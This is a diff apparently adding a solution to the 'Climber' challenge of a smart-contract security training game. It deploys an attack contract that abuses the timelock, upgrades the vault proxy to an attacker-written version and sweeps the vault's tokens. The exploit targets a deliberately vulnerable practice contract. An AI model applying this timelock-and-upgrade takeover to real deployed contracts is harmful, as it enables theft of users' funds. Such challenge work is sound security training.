@@ -58,6 +58,19 @@ describe('[Challenge] Climber', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        this.attackerContract = await (
+            await ethers.getContractFactory("ClimberAttack", attacker)
+          ).deploy(this.timelock.address, this.vault.address)
+        
+          // Call evil function on evil contract
+          await this.attackerContract.connect(attacker).timelockExecute()
+        
+          // Update Vault with VaultV2
+          this.climberVaultV2 = await ethers.getContractFactory("ClimberVaultV2", attacker)
+          const vaultV2 = await upgrades.upgradeProxy(this.vault.address, this.climberVaultV2)
+        
+          // Sweep the funds of the new VaultV2 contract
+          await vaultV2.connect(attacker).sweepFunds(this.token.address)
     });
 
     after(async function () {
